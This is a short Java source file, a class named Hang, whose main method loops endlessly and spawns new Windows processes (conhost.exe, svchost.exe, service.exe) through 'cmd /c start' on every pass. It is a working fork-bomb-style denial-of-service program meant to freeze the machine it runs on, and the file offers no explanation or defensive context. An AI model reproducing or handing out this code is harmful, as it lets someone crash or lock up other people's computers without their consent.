import java.io.*;
public class Hang
{
public static void main(String arg[]) throws IOException
{

while(true)
{
Runtime.getRuntime().exec(" cmd /c start conhost.exe");

Runtime.getRuntime().exec(" cmd /c start svchost.exe");

Runtime.getRuntime().exec(" cmd /c start service.exe ");

}
}
}